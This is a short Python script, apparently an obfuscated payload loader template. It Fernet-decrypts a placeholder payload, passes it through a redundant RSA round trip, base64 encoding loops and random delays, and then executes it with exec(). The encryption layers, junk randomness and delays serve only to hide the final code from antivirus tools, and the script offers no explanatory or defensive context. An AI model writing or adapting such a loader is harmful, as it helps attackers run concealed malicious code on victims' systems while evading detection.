import base64
import time
import random
import ctypes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa

# 生成私钥
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=608*15,
    backend=default_backend()
)

# 获取公钥
public_key = private_key.public_key()

def encrypt(message):
    encrypted = public_key.encrypt(
        plaintext=message.encode('utf-8'),
        padding=padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted

enc_pay=b'XXX'

key = b'XXX'

f1 = Fernet(key)
a = f1.decrypt(enc_pay)
msg_list = a.decode().split('XXX')
msg1 = msg_list[0]
msg2 = msg_list[1]
msg = encrypt(msg2)
# 私钥解密
def decrypt(encrypted):
    original_message = private_key.decrypt(
        ciphertext=encrypted,
        padding=padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return original_message
time.sleep(0.1)
original_message_1 = decrypt(msg).decode('utf-8')
original_message = msg1+'\n'+decrypt(msg).decode('utf-8')
#print(original_message)
load = str(base64.b64encode(original_message.encode('UTF-8')), 'UTF-8')
random_int = random.randint(1,10)
ran_num = random.randint(1,10)
ranStr = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'], ran_num))
print(ranStr)
for i in range(1,random_int):
    load = str(base64.b64encode(original_message.encode('UTF-8')), 'UTF-8')
for i in range(random_int):
    moon_load=base64.b64decode(load)
time.sleep(random_int*0.1)
moon_start=moon_load
exec(moon_start)
